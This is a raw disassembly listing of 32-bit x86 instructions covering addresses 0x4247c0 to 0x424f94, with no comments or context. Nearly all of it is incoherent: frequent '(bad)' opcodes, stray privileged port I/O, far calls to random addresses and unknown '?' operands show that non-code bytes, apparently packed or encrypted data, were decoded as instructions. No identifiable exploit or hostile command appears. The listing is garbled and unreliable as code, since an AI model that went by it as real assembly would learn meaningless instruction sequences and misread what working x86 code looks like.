  4247c0:	ret    0xc168
  4247c3:	std    
  4247c4:	and    eax,DWORD PTR [edi]
  4247c6:	mov    bh,0x1c
  4247c8:	xor    eax,0xbe77b4dc
  4247cd:	inc    ecx
  4247ce:	inc    esi
  4247cf:	cmp    eax,0xc6e9e394
  4247d4:	ficom  WORD PTR [ebx+0x5fc0b5b4]
  4247da:	mov    bl,BYTE PTR ds:0x8af42eaf
  4247e0:	xchg   ecx,eax
  4247e1:	in     al,dx
  4247e2:	jle    0x424848
  4247e4:	mov    eax,0xcb73d0cb
  4247e9:	fidivr WORD PTR [edi+0x3c73ca63]
  4247ef:	pop    es
  4247f0:	(bad)  
  4247f1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247f3:	pop    ds
  4247f4:	cli    
  4247f5:	pop    ds
  4247f6:	(bad)  
  4247f7:	test   DWORD PTR [edx],0x639cee50
  4247fd:	fdivp  st(3),st
  4247ff:	cdq    
  424800:	ds mov edx,0x6cd28da7
  424806:	jecxz  0x424839
  424808:	test   DWORD PTR [ebp-0x15],esi
  42480b:	hlt    
  42480c:	sub    BYTE PTR [edi-0x7bc61230],cl
  424812:	sub    ebx,eax
  424814:	int    0x11
  424816:	mov    esp,0x5b9b7b7f
  42481b:	inc    edi
  42481c:	repz pop edx
  42481e:	icebp  
  42481f:	shr    DWORD PTR [edi],0xd
  424822:	loope  0x42483b
  424824:	mov    ?,WORD PTR ds:0x821d555
  42482a:	sub    BYTE PTR ds:0x9967c44d,dl
  424830:	or     bh,BYTE PTR [eax-0x2b]
  424833:	ins    DWORD PTR es:[edi],dx
  424834:	mov    ah,0x2
  424836:	pop    eax
  424837:	adc    esi,ebx
  424839:	sub    al,0x98
  42483b:	sbb    ch,BYTE PTR [ebx]
  42483d:	imul   esp,DWORD PTR [eax],0x24c025ba
  424843:	loop   0x4247cc
  424845:	sbb    BYTE PTR [ecx-0x2e],dh
  424848:	jo     0x424842
  42484a:	pushf  
  42484b:	xor    eax,0xae7586a3
  424850:	arpl   WORD PTR [ecx],bx
  424852:	push   es
  424853:	pusha  
  424854:	jne    0x42480a
  424856:	pop    ebx
  424857:	or     ch,0xf7
  42485a:	fstp   QWORD PTR [edi]
  42485c:	les    ebp,FWORD PTR ds:0x2a5eefef
  424862:	test   eax,0xec3ca360
  424867:	mov    edi,ss
  424869:	lahf   
  42486a:	lods   al,BYTE PTR ds:[esi]
  42486b:	test   ecx,ebp
  42486d:	(bad)  
  42486e:	cmp    eax,0x75a653e7
  424873:	pop    ebp
  424874:	pop    eax
  424875:	xor    eax,0x3044857b
  42487a:	xchg   DWORD PTR [ecx-0x27c4a64a],ebp
  424880:	cmc    
  424881:	mov    ebp,0x33afaef4
  424886:	(bad)  
  424887:	leave  
  424888:	int3   
  424889:	repnz (bad) 
  42488b:	pop    ebx
  42488c:	jb     0x424840
  42488e:	xor    al,0x35
  424890:	cld    
  424891:	add    BYTE PTR [ebp-0x71be5f42],bl
  424897:	inc    esp
  424898:	push   ecx
  424899:	mov    esi,DWORD PTR [edx+edi*4-0x572ffb26]
  4248a0:	sti    
  4248a1:	cdq    
  4248a2:	fwait
  4248a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248a4:	push   0xe27988ef
  4248a9:	stos   DWORD PTR es:[edi],eax
  4248aa:	(bad)  
  4248ab:	sahf   
  4248ac:	sub    bh,BYTE PTR [ebx+0x47]
  4248af:	push   es
  4248b0:	stc    
  4248b1:	sub    ch,bl
  4248b3:	jo     0x424861
  4248b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248b6:	lods   al,BYTE PTR ds:[esi]
  4248b7:	cmp    cl,BYTE PTR ds:0x195c31cb
  4248bd:	sub    BYTE PTR [eax-0x2a],cl
  4248c0:	push   ds
  4248c1:	add    ch,BYTE PTR [ebx]
  4248c3:	mov    dh,0x83
  4248c5:	mov    edx,0x81f31803
  4248ca:	xchg   edx,eax
  4248cb:	mov    esi,0xf868a830
  4248d0:	or     eax,0x979e689d
  4248d5:	fwait
  4248d6:	sub    BYTE PTR [ebp-0x4a],al
  4248d9:	lods   eax,DWORD PTR ds:[esi]
  4248da:	adc    eax,0x326e5d44
  4248df:	jle    0x424915
  4248e1:	test   al,0x10
  4248e3:	int    0x7c
  4248e5:	retf   0x9d47
  4248e8:	mov    BYTE PTR [edx-0x9aca26],bl
  4248ee:	xchg   BYTE PTR [edx+0x1f],dl
  4248f1:	pop    ecx
  4248f2:	mov    eax,fs:0xc8839008
  4248f8:	ror    DWORD PTR [edx+edx*2],1
  4248fb:	outs   dx,DWORD PTR ds:[esi]
  4248fc:	pop    esi
  4248fd:	int3   
  4248fe:	push   esi
  4248ff:	mov    BYTE PTR [ebx+0x76f7b760],ch
  424905:	fcomp  DWORD PTR [ecx+0x67]
  424908:	pop    ds
  424909:	pushf  
  42490a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42490b:	dec    ebx
  42490c:	and    al,0x5d
  42490e:	mov    ecx,0x4b23055c
  424913:	(bad)  
  424915:	sub    eax,0x6a468c1
  42491a:	push   ds
  42491b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42491c:	mov    al,ds:0xa2fba179
  424921:	repz mov al,0xbd
  424924:	ds adc eax,0xa93aab97
  42492a:	dec    ebp
  42492b:	jnp    0x4248e9
  42492d:	push   edi
  42492e:	int    0x66
  424930:	sub    BYTE PTR [esi-0x7b],ah
  424933:	call   0xa0c97ec2
  424938:	std    
  424939:	fwait
  42493a:	push   es
  42493b:	enter  0x781d,0x39
  42493f:	and    cl,dl
  424941:	jb     0x424926
  424943:	(bad)  
  424944:	gs (bad) 
  424946:	and    eax,0x2618ba24
  42494b:	cmp    DWORD PTR [ebx+edx*8-0x1abefa34],0x63
  424953:	jne    0x4249c3
  424955:	mov    dh,BYTE PTR [ecx+0x3e]
  424958:	sbb    ecx,DWORD PTR [esi-0x6e]
  42495b:	push   0xfffffff7
  42495d:	adc    dl,BYTE PTR [edx-0x4a57f76b]
  424963:	inc    edi
  424964:	lods   eax,DWORD PTR ds:[esi]
  424965:	ds or  al,al
  424968:	lock aas 
  42496a:	aaa    
  42496b:	aad    0xde
  42496d:	jg     0x42491d
  42496f:	outs   dx,BYTE PTR ds:[esi]
  424970:	sbb    bl,0x22
  424973:	and    BYTE PTR [ecx-0x50],ah
  424976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424977:	cmp    BYTE PTR [edi-0x2d],0x55
  42497b:	pop    edi
  42497c:	data16 sub BYTE PTR [ebp+0x183d75b7],0xa0
  424984:	pop    ds
  424985:	add    DWORD PTR [ecx-0x7],eax
  424988:	in     al,0xa8
  42498a:	shl    DWORD PTR [ebp+0x4d],0xc4
  42498e:	adc    DWORD PTR [esi],ebx
  424990:	stos   BYTE PTR es:[edi],al
  424991:	aam    0x87
  424993:	int3   
  424994:	out    dx,al
  424995:	xchg   ch,ch
  424997:	inc    esp
  424998:	(bad)  
  424999:	test   BYTE PTR [esi],0xd9
  42499c:	shl    al,0xbc
  42499f:	push   es
  4249a0:	dec    edi
  4249a1:	shr    eax,cl
  4249a3:	out    dx,al
  4249a4:	addr16 push cs
  4249a6:	sub    eax,0x24f7fea0
  4249ab:	push   esi
  4249ac:	pop    eax
  4249ad:	xchg   edi,eax
  4249ae:	mov    edi,0x51b10007
  4249b3:	xchg   ebp,eax
  4249b4:	out    dx,al
  4249b5:	xor    bl,BYTE PTR [edx]
  4249b7:	data16 jno 0x424992
  4249ba:	sub    DWORD PTR [edx+edx*8+0x1b],ebx
  4249be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249bf:	jecxz  0x4249f7
  4249c1:	(bad)  
  4249c3:	pop    es
  4249c4:	popa   
  4249c5:	fs add al,0x75
  4249c8:	sbb    eax,0xa6687910
  4249cd:	leave  
  4249ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249cf:	jecxz  0x424a01
  4249d1:	out    dx,eax
  4249d2:	fbld   TBYTE PTR [ecx+0x3b]
  4249d5:	mov    BYTE PTR [edi+0x21],bl
  4249d8:	push   0xb
  4249da:	(bad)  
  4249db:	jl     0x42499a
  4249dd:	jp     0x424a10
  4249df:	inc    eax
  4249e0:	aam    0x70
  4249e2:	mov    edx,0x5efbdc0a
  4249e7:	xor    ch,BYTE PTR [edi]
  4249e9:	adc    bl,BYTE PTR [eax-0x63561b1b]
  4249ef:	cmp    eax,0x36af91eb
  4249f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249f5:	inc    esp
  4249f6:	jecxz  0x4249a1
  4249f8:	or     bh,cl
  4249fa:	sar    esi,0xdf
  4249fd:	outs   dx,BYTE PTR ds:[esi]
  4249fe:	dec    edx
  4249ff:	push   esi
  424a00:	(bad)  
  424a02:	ror    edi,1
  424a04:	ins    DWORD PTR es:[edi],dx
  424a05:	push   cs
  424a06:	or     eax,DWORD PTR [edi+0x3cdbcc12]
  424a0c:	lods   al,BYTE PTR ds:[esi]
  424a0d:	ss pop ds
  424a0f:	inc    ebx
  424a10:	inc    edx
  424a11:	hlt    
  424a12:	add    DWORD PTR [ebp+0x31],ecx
  424a15:	push   ds
  424a16:	pop    es
  424a17:	out    0x3f,al
  424a19:	ds add eax,0x7fae88d9
  424a1f:	rol    edi,0x86
  424a22:	sub    al,0xfd
  424a24:	sbb    ecx,DWORD PTR [eax+eiz*8]
  424a27:	sbb    ebx,edi
  424a29:	or     DWORD PTR [edx],0x30
  424a2c:	lods   al,BYTE PTR ds:[esi]
  424a2d:	cli    
  424a2e:	mov    ebp,0xa51674af
  424a33:	sub    ebp,ebp
  424a35:	rol    BYTE PTR ds:0xf31406f5,0x81
  424a3c:	retf   0x34fd
  424a3f:	pop    ss
  424a40:	adc    DWORD PTR [eax+0x50],ebx
  424a43:	xchg   ecx,eax
  424a44:	mov    ebx,0x2cfea6a1
  424a49:	mov    edx,0x6d5317fb
  424a4e:	xor    al,0x65
  424a50:	sub    al,0xaf
  424a52:	jae    0x424a0e
  424a54:	jp     0x4249d7
  424a56:	test   eax,0x415a47a4
  424a5b:	sbb    al,0x54
  424a5d:	mov    ds:0x0,al
	...
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	mov    WORD PTR [ebx-0x27e7aa55],?
  424a7c:	add    DWORD PTR [eax],eax
  424a7e:	jl     0x424a86
  424a80:	add    BYTE PTR [eax],al
  424a82:	xor    ebp,DWORD PTR ss:[ecx-0x3376564d]
  424a89:	add    DWORD PTR [eax],0x21
  424a8c:	stc    
  424a8d:	dec    esp
  424a8e:	out    0xee,al
  424a90:	push   esi
  424a91:	mov    edi,0x60c22e56
  424a96:	mov    ebp,0xe8007df1
  424a9b:	bound  edi,QWORD PTR [ebp+0x4b05ce46]
  424aa1:	test   eax,0x7f447cab
  424aa6:	not    dh
  424aa8:	pop    ecx
  424aa9:	bound  esi,QWORD PTR [eax+esi*1-0xa]
  424aad:	jmp    DWORD PTR [esp+eiz*8-0x28a873cf]
  424ab4:	or     DWORD PTR [ebp+0x3c],0x29140635
  424abb:	cdq    
  424abc:	add    BYTE PTR [esi-0x57003541],dh
  424ac2:	and    dl,BYTE PTR [bx+si-0x6bb9]
  424ac7:	ins    DWORD PTR es:[edi],dx
  424ac8:	cmp    BYTE PTR [edx-0x5],ah
  424acb:	mov    ch,dl
  424acd:	adc    BYTE PTR [ecx],0xfe
  424ad0:	jo     0x424aee
  424ad2:	ret    
  424ad3:	push   ebx
  424ad4:	and    al,0x36
  424ad6:	and    DWORD PTR [ebx-0x18b61482],eax
  424adc:	in     al,dx
  424add:	xor    eax,0x3c8f57dc
  424ae2:	inc    edx
  424ae3:	adc    al,bh
  424ae5:	popa   
  424ae6:	hlt    
  424ae7:	cli    
  424ae8:	add    ebx,DWORD PTR [ebp-0x15]
  424aeb:	add    al,0xe9
  424aed:	pop    esp
  424aee:	push   edx
  424aef:	and    BYTE PTR [ebx],dh
  424af1:	dec    esp
  424af2:	shr    BYTE PTR ds:0x7c099f75,cl
  424af8:	jmp    0xa860ad4a
  424afd:	push   0x8fa846d7
  424b02:	aaa    
  424b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b04:	popa   
  424b05:	jmp    0xa5b6:0x94e29378
  424b0c:	push   0xbf8cf2ab
  424b11:	stos   BYTE PTR es:[edi],al
  424b12:	ds mov ebp,eax
  424b15:	or     esi,ecx
  424b17:	jl     0x424a9c
  424b19:	cmp    ch,bh
  424b1b:	sub    BYTE PTR [ecx],al
  424b1d:	push   edi
  424b1e:	adc    BYTE PTR [ecx+ecx*8+0xa48102a],al
  424b25:	xor    eax,0xf56276ad
  424b2a:	sub    ch,BYTE PTR [eax-0x4e619c3c]
  424b30:	ja     0x424b71
  424b32:	pop    ecx
  424b33:	test   DWORD PTR [ecx-0x20],ebp
  424b36:	and    esi,DWORD PTR [esi-0xe89c723]
  424b3c:	adc    BYTE PTR [ebp+0x89e70ee],dl
  424b42:	add    cl,BYTE PTR [eax]
  424b44:	fwait
  424b45:	mov    ebp,0x60ecc05c
  424b4a:	mov    esp,0x98c0c113
  424b4f:	mov    dh,0x7e
  424b51:	jns    0x424b12
  424b53:	xchg   edi,eax
  424b54:	xor    esp,DWORD PTR [edi]
  424b56:	js     0x424b66
  424b58:	retf   0x57c3
  424b5b:	inc    eax
  424b5c:	sub    ecx,ebp
  424b5e:	popf   
  424b5f:	loope  0x424b10
  424b61:	test   BYTE PTR [edi+0x79101510],cl
  424b67:	shl    DWORD PTR [ebp+0x2c],cl
  424b6a:	or     al,0x6
  424b6c:	inc    edi
  424b6d:	enter  0xcc8a,0x2b
  424b71:	or     al,0xb2
  424b73:	rcr    DWORD PTR [ebx],cl
  424b75:	loop   0x424b81
  424b77:	and    eax,0xf538bd23
  424b7c:	in     eax,dx
  424b7d:	dec    esi
  424b7e:	into   
  424b7f:	ret    
  424b80:	push   esi
  424b81:	repnz loop 0x424b1f
  424b84:	cmp    DWORD PTR [bp+si-0x59b8],ecx
  424b89:	mov    ds:0xf6288984,al
  424b8e:	call   0x796bf9dc
  424b93:	shl    bl,cl
  424b95:	das    
  424b96:	(bad)  
  424b97:	shld   edx,ebx,cl
  424b9a:	std    
  424b9b:	cli    
  424b9c:	pop    esi
  424b9d:	mov    ch,0xe2
  424b9f:	or     ah,BYTE PTR [ecx-0x4c2a3319]
  424ba5:	dec    esp
  424ba6:	mov    ecx,0x1886cea1
  424bab:	dec    ebx
  424bac:	push   ss
  424bad:	mov    dh,0xff
  424baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bb0:	popf   
  424bb1:	mov    ds:0xa255e0ce,al
  424bb6:	mov    eax,ds:0xd73c0ac9
  424bbb:	lock popf 
  424bbd:	loope  0x424be9
  424bbf:	adc    DWORD PTR [esi+0x19],ebp
  424bc2:	out    dx,eax
  424bc3:	(bad)  
  424bc5:	aam    0xd1
  424bc7:	cli    
  424bc8:	or     ch,0x79
  424bcb:	jle    0x424b83
  424bcd:	mov    ch,0x8d
  424bcf:	cmc    
  424bd0:	aam    0x2d
  424bd2:	and    DWORD PTR [edx+0x44],0xfffffffa
  424bd6:	mov    ebp,0x1aad486c
  424bdb:	sti    
  424bdc:	aad    0x9e
  424bde:	fimul  WORD PTR [ecx+0x77]
  424be1:	repnz sbb eax,0x84dde6f4
  424be7:	popf   
  424be8:	sbb    edi,DWORD PTR [ecx]
  424bea:	test   eax,0x543bee1
  424bef:	aad    0x9a
  424bf1:	or     DWORD PTR [edx],esp
  424bf3:	push   edi
  424bf4:	shr    DWORD PTR [eax+0x19e9be20],cl
  424bfa:	add    DWORD PTR [eax],ebp
  424bfc:	xchg   ebx,eax
  424bfd:	sbb    al,0x6a
  424bff:	push   0x53
  424c01:	(bad)  
  424c02:	aas    
  424c03:	mov    ds:0xd5a37958,eax
  424c08:	inc    edx
  424c09:	jl     0x424bf3
  424c0b:	sahf   
  424c0c:	sbb    dl,BYTE PTR [ecx+0x64]
  424c0f:	mov    eax,ds:0xdee77d29
  424c14:	fidivr DWORD PTR [esi-0x247be6b3]
  424c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c1b:	out    dx,eax
  424c1c:	call   0xfcff4ea5
  424c21:	repz add dh,BYTE PTR [ebx]
  424c24:	cmp    cl,ch
  424c26:	or     ecx,DWORD PTR ds:0xd807af16
  424c2c:	dec    ebx
  424c2d:	or     eax,0x3e65fbaf
  424c32:	sbb    ch,BYTE PTR [edi+0x378cd1ac]
  424c38:	adc    BYTE PTR [esi+ebx*2-0x67],bh
  424c3c:	pop    eax
  424c3d:	sub    cl,al
  424c3f:	(bad)  
  424c40:	test   BYTE PTR [ecx],0x7f
  424c43:	call   0x6697:0x95959ec5
  424c4a:	data16 sub BYTE PTR [esi],ch
  424c4d:	(bad)  
  424c4e:	mov    ecx,0x25f905ac
  424c53:	xor    BYTE PTR [esi+0x10b0a272],bl
  424c59:	mov    ebp,0x75236661
  424c5e:	ss jno 0x424c1c
  424c61:	in     eax,0x97
  424c63:	add    DWORD PTR [edi-0x5b],ebx
  424c66:	or     BYTE PTR [ecx+0x184af1b2],cl
  424c6c:	in     al,0xd
  424c6e:	loopne 0x424ce7
  424c70:	outs   dx,BYTE PTR ds:[esi]
  424c71:	xchg   al,bh
  424c73:	fcmovnu st,st(6)
  424c75:	and    al,0x1d
  424c77:	iret   
  424c78:	je     0x424c42
  424c7a:	lahf   
  424c7b:	fstp   st(6)
  424c7d:	int    0x54
  424c7f:	mov    ch,0x18
  424c81:	iret   
  424c82:	mov    esi,0xb5b4e500
  424c87:	aad    0x1a
  424c89:	pop    esi
  424c8a:	mov    edi,0xc10bf67e
  424c8f:	or     al,0x33
  424c91:	retf   0x4de8
  424c94:	outs   dx,DWORD PTR ds:[esi]
  424c95:	pusha  
  424c96:	push   eax
  424c97:	mov    DWORD PTR [eax],edx
  424c99:	outs   dx,BYTE PTR ds:[esi]
  424c9a:	jnp    0x424ce1
  424c9c:	aaa    
  424c9d:	hlt    
  424c9e:	dec    ebp
  424c9f:	sub    ebx,DWORD PTR [esi]
  424ca1:	jecxz  0x424c77
  424ca3:	lahf   
  424ca4:	call   0xe4a1203a
  424ca9:	pop    esi
  424caa:	sbb    eax,0x4536f4ca
  424caf:	push   0x1b
  424cb1:	dec    eax
  424cb2:	inc    esi
  424cb3:	jne    0x424c62
  424cb5:	cwde   
  424cb6:	mov    al,ds:0x8bb9dc07
  424cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cbc:	std    
  424cbd:	iret   
  424cbe:	hlt    
  424cbf:	dec    esp
  424cc0:	scas   al,BYTE PTR es:[edi]
  424cc1:	loope  0x424d0c
  424cc3:	call   0xb942:0x692c7dd0
  424cca:	jnp    0x424c7a
  424ccc:	or     bh,BYTE PTR [esi+0x3a2dacf2]
  424cd2:	cmc    
  424cd3:	inc    esi
  424cd4:	jmp    0x424d34
  424cd6:	sbb    eax,0xfa43d37c
  424cdb:	bound  esp,QWORD PTR [ecx-0x64]
  424cde:	call   0x5aa259f
  424ce3:	inc    ebp
  424ce4:	xchg   ebp,eax
  424ce5:	and    esi,DWORD PTR [edi]
  424ce7:	mov    DWORD PTR [ecx+eax*1-0x88f664e],esp
  424cee:	arpl   WORD PTR [esi+0x4d],bx
  424cf1:	jae    0x424d5a
  424cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cf4:	pop    edi
  424cf5:	mov    WORD PTR [ebx],cs
  424cf7:	leave  
  424cf8:	push   0x6a
  424cfa:	scas   eax,DWORD PTR es:[edi]
  424cfb:	popf   
  424cfc:	loopne 0x424d04
  424cfe:	mov    BYTE PTR cs:[eax+0x835242f],ch
  424d05:	in     al,0x60
  424d07:	lods   al,BYTE PTR ds:[esi]
  424d08:	rol    BYTE PTR [eax-0x9],1
  424d0b:	jb     0x424cc8
  424d0d:	and    esp,ebp
  424d0f:	dec    esi
  424d10:	shl    DWORD PTR [eiz*2-0x71dc8c21],cl
  424d17:	in     al,dx
  424d18:	loope  0x424d4a
  424d1a:	or     edi,DWORD PTR [edi+edx*1+0x33]
  424d1e:	xchg   ebp,eax
  424d1f:	xchg   edi,eax
  424d20:	jecxz  0x424cc2
  424d22:	repnz (bad) 
  424d24:	cmp    BYTE PTR [ecx+0x38],bh
  424d27:	(bad)  
  424d28:	jge    0x424d86
  424d2a:	sbb    DWORD PTR [ecx+eax*1-0x7dc12b6f],esp
  424d31:	ficom  WORD PTR [ebx]
  424d33:	push   ebx
  424d34:	push   ds
  424d35:	out    dx,eax
  424d36:	mov    ch,0xbb
  424d38:	pushf  
  424d39:	and    al,0xe5
  424d3b:	push   eax
  424d3c:	jno    0x424cdf
  424d3e:	test   BYTE PTR [edx],dl
  424d40:	ret    0x13a4
  424d43:	fdivr  DWORD PTR [ecx-0x4d2370b6]
  424d49:	dec    ebp
  424d4a:	sti    
  424d4b:	mov    ebp,0x7d1f8db0
  424d50:	fldenv [ebp+0x35]
  424d53:	mov    dl,0xc0
  424d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d56:	mov    DWORD PTR [esi+0x50246c12],esp
  424d5c:	outs   dx,DWORD PTR ds:[esi]
  424d5d:	stc    
  424d5e:	and    eax,0x674ce04
  424d63:	fcom   QWORD PTR [edx+0x6e8b21ef]
  424d69:	and    al,0x74
  424d6c:	fsubr  QWORD PTR ds:0x76274374
  424d72:	into   
  424d73:	jbe    0x424d7c
  424d75:	cld    
  424d76:	sti    
  424d77:	cmp    DWORD PTR [ecx-0x6e8ed60],edi
  424d7d:	add    dh,BYTE PTR [edx-0x5025c111]
  424d83:	cmp    DWORD PTR [edi-0x49fa8db0],ebp
  424d89:	xor    DWORD PTR [esi-0x1ca99c1c],0x3a
  424d90:	xor    bl,cl
  424d92:	(bad)  
  424d93:	gs and al,0x22
  424d96:	fldcw  WORD PTR [bp+si]
  424d99:	jo     0x424dd1
  424d9b:	xchg   esi,eax
  424d9c:	push   ss
  424d9d:	(bad)  
  424d9e:	mov    ds:0x7382c338,eax
  424da3:	cwde   
  424da4:	cmc    
  424da5:	jb     0x424d8b
  424da7:	clc    
  424da8:	inc    ebp
  424da9:	jb     0x424dda
  424dab:	retf   
  424dac:	test   al,0x68
  424dae:	retf   
  424daf:	xchg   ecx,eax
  424db0:	imul   edx,esp,0x1f
  424db3:	or     eax,0xa1c81317
  424db8:	pop    eax
  424db9:	imul   esp,DWORD PTR [ebx+edx*1-0x3],0xffffffdd
  424dbe:	outs   dx,DWORD PTR ds:[esi]
  424dbf:	and    dh,dl
  424dc1:	aas    
  424dc2:	inc    ebp
  424dc3:	xchg   ebp,eax
  424dc4:	fcomp  DWORD PTR [edi]
  424dc6:	xchg   BYTE PTR [ecx+0x2d55dca7],bl
  424dcc:	not    DWORD PTR [ecx-0x61]
  424dcf:	mov    DWORD PTR [edi+0x2b6e725c],0x9d70e8a1
  424dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dda:	ret    
  424ddb:	jb     0x424de5
  424ddd:	jno    0x424d70
  424ddf:	popf   
  424de0:	push   es
  424de1:	shr    ebp,1
  424de3:	pop    ds
  424de4:	jns    0x424dd1
  424de6:	xchg   BYTE PTR [esi],ch
  424de8:	mov    ebp,0xbbab88a
  424ded:	cli    
  424dee:	dec    esi
  424def:	adc    BYTE PTR ds:0x78a521a6,al
  424df5:	sub    al,0x9b
  424df7:	repz or ah,BYTE PTR [ebx+0x36f33bac]
  424dfe:	ror    DWORD PTR [ebx+eax*4+0x689e4204],cl
  424e05:	mov    eax,ds:0x5d91ac48
  424e0a:	sub    bl,BYTE PTR cs:[ebp+0x2587308e]
  424e11:	pusha  
  424e12:	cmp    eax,DWORD PTR [ebx+0x11]
  424e15:	iret   
  424e16:	cmp    eax,DWORD PTR [edx-0x5c5152a6]
  424e1c:	inc    edi
  424e1d:	std    
  424e1e:	test   eax,0x24b064fb
  424e23:	idiv   ecx
  424e25:	sub    al,0x79
  424e27:	xchg   edi,eax
  424e28:	inc    edi
  424e29:	int    0xb2
  424e2b:	adc    esi,DWORD PTR [esp+edx*1]
  424e2e:	fisttp QWORD PTR [ebx]
  424e30:	jno    0x424e22
  424e32:	aas    
  424e33:	or     dl,BYTE PTR ds:0xe4ffd29b
  424e39:	lods   eax,DWORD PTR ds:[esi]
  424e3a:	push   cs
  424e3b:	xor    BYTE PTR [ebx+0x5f820c19],ah
  424e41:	inc    esi
  424e42:	xor    BYTE PTR [edi-0x25125171],bh
  424e48:	imul   esi,DWORD PTR [edx+0x7c],0xaa3115ba
  424e4f:	popa   
  424e50:	lds    esi,FWORD PTR [esi+0x1f250405]
  424e56:	inc    edx
  424e57:	sub    BYTE PTR [edi-0x4f],bl
  424e5a:	mov    bl,0x39
  424e5c:	sar    DWORD PTR [edi-0x193b5afd],cl
  424e62:	test   eax,0xcea68811
  424e67:	dec    ecx
  424e68:	out    dx,al
  424e69:	int    0x5e
  424e6b:	cmp    BYTE PTR [eax+edx*1-0xc37d69e],ah
  424e72:	cmp    DWORD PTR [ebp-0x5a13241b],esi
  424e78:	sbb    ebx,DWORD PTR [ecx+0x61]
  424e7b:	jmp    0x424eee
  424e7d:	cmc    
  424e7e:	or     al,0x87
  424e80:	or     al,0x26
  424e82:	enter  0xa2a8,0x26
  424e86:	out    dx,al
  424e87:	jecxz  0x424ef5
  424e89:	adc    BYTE PTR [ebx-0xfade35b],bl
  424e8f:	cli    
  424e90:	je     0x424e82
  424e92:	out    0x24,al
  424e94:	loop   0x424edb
  424e96:	outs   dx,DWORD PTR ds:[esi]
  424e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e98:	enter  0x63b9,0x1d
  424e9c:	inc    eax
  424e9d:	out    0xae,al
  424e9f:	repnz push edi
  424ea1:	mov    gs,WORD PTR [edx-0x2ae998d1]
  424ea7:	and    eax,0x2f174743
  424eac:	mov    bh,0x92
  424eae:	mov    ah,0x9b
  424eb0:	popf   
  424eb1:	sbb    esi,eax
  424eb3:	es push ecx
  424eb5:	popa   
  424eb6:	ins    BYTE PTR es:[edi],dx
  424eb7:	add    al,0x89
  424eb9:	test   DWORD PTR [edx-0x7da7c422],eax
  424ebf:	sti    
  424ec0:	out    0xa0,eax
  424ec2:	sub    esp,DWORD PTR [esi]
  424ec4:	mov    al,ds:0x6f1e3bfb
  424ec9:	mov    bl,0x37
  424ecb:	adc    bl,BYTE PTR [esi-0x24]
  424ece:	into   
  424ecf:	in     al,0x5
  424ed1:	adc    eax,DWORD PTR [edx-0x29]
  424ed4:	sbb    eax,0x8cda5bce
  424ed9:	adc    dh,BYTE PTR [ecx-0x13]
  424edc:	sar    DWORD PTR [eax+0x7b60c04d],0xd0
  424ee3:	mov    edi,0x55e76a19
  424ee8:	fistp  QWORD PTR [edx]
  424eea:	dec    edi
  424eeb:	fadd   st,st(4)
  424eed:	je     0x424ea8
  424eef:	inc    ebx
  424ef0:	cs sbb al,0x70
  424ef3:	fistp  WORD PTR [edi]
  424ef5:	std    
  424ef6:	pop    ebp
  424ef7:	rol    DWORD PTR [ebx+0xae67c3e],0xa
  424efe:	scas   eax,DWORD PTR es:[edi]
  424eff:	mov    eax,0x3414d375
  424f04:	fidiv  WORD PTR [esi]
  424f06:	jg     0x424f34
  424f08:	xchg   edi,eax
  424f09:	out    0x12,al
  424f0b:	inc    esp
  424f0c:	fist   DWORD PTR [ebp-0x20a3b158]
  424f12:	inc    ecx
  424f13:	push   ds
  424f14:	sub    eax,0xcacab962
  424f19:	pop    eax
  424f1a:	dec    ebp
  424f1b:	adc    al,0x7e
  424f1d:	shl    DWORD PTR [ecx],cl
  424f1f:	add    eax,0x363116cf
  424f24:	(bad)  
  424f25:	fcomp  QWORD PTR [ebx+0x34]
  424f28:	lods   al,BYTE PTR ds:[esi]
  424f29:	es pushf 
  424f2b:	xchg   ecx,eax
  424f2c:	cmp    al,BYTE PTR [edx]
  424f2e:	loop   0x424f45
  424f30:	loope  0x424ee2
  424f32:	mov    al,0x41
  424f34:	bound  esi,QWORD PTR [ecx-0x65]
  424f37:	pop    ds
  424f38:	push   ebp
  424f39:	fistp  DWORD PTR [eax-0x13]
  424f3c:	sub    dl,BYTE PTR [bx]
  424f3f:	icebp  
  424f40:	outs   dx,DWORD PTR ds:[esi]
  424f41:	repnz mov cl,0xce
  424f44:	arpl   WORD PTR [edi],bp
  424f46:	clc    
  424f47:	jno    0x424f1c
  424f49:	or     DWORD PTR [edx],edx
  424f4b:	add    al,0xe
  424f4d:	mov    eax,ds:0x3d755a20
  424f52:	retf   0x8b3d
  424f55:	bound  ebx,QWORD PTR [eax+0x2e]
  424f58:	repnz cmc 
  424f5a:	mov    al,ds:0x3b75582c
  424f5f:	sbb    ebx,DWORD PTR [edi-0x3be526b1]
  424f65:	mov    edi,0x13f42ed
  424f6a:	fimul  DWORD PTR [ecx+0x6d]
  424f6d:	and    DWORD PTR [edi-0x60],eax
  424f70:	mov    al,0x99
  424f72:	mov    ds:0x3275349b,al
  424f77:	xchg   ecx,eax
  424f78:	mov    ebp,0x96ea3f65
  424f7d:	jno    0x424f53
  424f7f:	or     BYTE PTR [edi+edi*4-0x21],al
  424f83:	sbb    eax,0x78157071
  424f88:	inc    esi
  424f89:	xchg   BYTE PTR [eax+0x79],ch
  424f8c:	ret    0x6370
  424f8f:	mov    ?,WORD PTR [edx+0x4d]
  424f92:	jo     0x424fc1
  424f94:	pop    ebx
